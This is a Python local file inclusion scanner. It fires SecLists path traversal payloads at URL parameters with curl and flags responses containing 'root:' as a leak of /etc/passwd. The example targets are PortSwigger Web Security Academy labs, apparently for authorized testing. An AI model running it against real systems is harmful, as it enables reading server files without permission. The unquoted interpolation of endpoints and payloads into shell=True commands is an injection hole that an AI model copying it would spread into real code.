import os
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed
from Operations import Operations

class LFI:
    
    def execute_command(self, command):
        """Execute a shell command and return its output."""
        proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, start_new_session=True)
        stdout, stderr = proc.communicate()
        return stdout.decode("utf-8")
    
    def scan_endpoint(self, end_point, payload):
        new_endpoint = self.execute_command(f"echo '{end_point}' | qsreplace {payload}").strip()
        command = f"curl -s -L -H 'X-Bugbounty: Testing' -H 'User-Agent: Mozilla/5.0' --insecure '{new_endpoint}'"
        result = self.execute_command(command)
        return new_endpoint, payload, result

    def lfi(self, end_points):
        errors = []
        reports = {}
        print("[●] Vulnerabilities Scanning  -  LFI")
        try:
            payloads = Operations.get_file_content("/usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt")
            with ThreadPoolExecutor(max_workers=200) as executor:
                future_to_scan = {executor.submit(self.scan_endpoint, end_point, payload): (end_point, payload) 
                                  for end_point in end_points 
                                  for payload in payloads}
                
                for future in as_completed(future_to_scan):
                    end_point, payload = future_to_scan[future]
                    print("wtf")
                    try:
                        new_endpoint, payload, result = future.result()
                        print(f"command: {new_endpoint}")
                        print(f"command result: {result}")
                        if "root:" in result:
                            reports[end_point] = [payload, result]
                            # break  # Stop scanning the current endpoint if a vulnerability is found
                    except Exception as e:
                        print(f"Error during scanning: {e}")
                        errors.append(str(e))
        except Exception as e:
            print(f"Error during setup: {e}")
            errors.append(str(e))
        
        found_count = len(reports)
        print(f"[●] Vulnerabilities Scanned  -  LFI\t Found: {found_count}")
        
        return errors, reports

# Example usage
if __name__ == "__main__":
    # Define endpoints to scan (if applicable)
    end_points = ['https://0a330092048976c881ab2a79009a00b7.web-security-academy.net/image?filename=75.jpg','https://0ac600fe03c3fc8a80967111009400d0.web-security-academy.net/image?filename=61.jpg']
    lfi = LFI()
    errors, reports = lfi.lfi(end_points)
    print("Errors:", errors)
    print("Reports:", reports)
